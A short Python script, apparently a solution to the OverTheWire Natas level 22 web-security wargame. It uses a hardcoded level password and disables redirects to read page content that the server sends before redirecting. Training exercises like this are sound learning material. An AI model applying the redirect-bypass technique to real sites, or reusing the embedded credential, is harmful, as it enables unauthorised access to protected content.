#!/usr/bin/python3
# Time: 2019/04/23 3:59 PM


import requests
import base64
import codecs


# 禁止跳转

username = 'natas22'
password = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'
url = f'http://{username}.natas.labs.overthewire.org/?revelio=1'


# url = f'http://{username}.natas.labs.overthewire.org/'
s = requests.Session()


resp = s.get(url, auth=(username, password), data={"admin": "1"}, allow_redirects=False)
print(resp.text)
print("**"*40)


